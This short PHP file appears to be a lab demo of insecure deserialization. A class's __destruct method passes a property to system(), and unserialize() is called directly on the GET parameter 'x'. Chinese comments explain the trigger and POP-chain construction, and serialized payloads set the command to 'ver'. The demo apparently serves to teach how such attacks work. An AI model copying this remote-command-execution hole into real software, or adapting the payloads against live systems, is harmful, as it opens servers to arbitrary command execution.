<?php
class B{
    public $cmd='';
    public function __destruct()
    {
        system($this->cmd);
    }
}
//函数引用，无对象创建触发魔术方法
unserialize($_GET['x']);


//?x=O:1:"B":0:{}
//?x=O:1:"B":1:{s:3:"cmd";s:3:"ver";}

//POP链构造
//<?php
//class B
//{
//    public $cmd = 'ver';
//
//}
//
//$x = new B();
//echo serialize($x);

//?x=O:1:"B":0:{}
//?x=O:1:"B":1:{s:3:"cmd";s:3:"ver";}



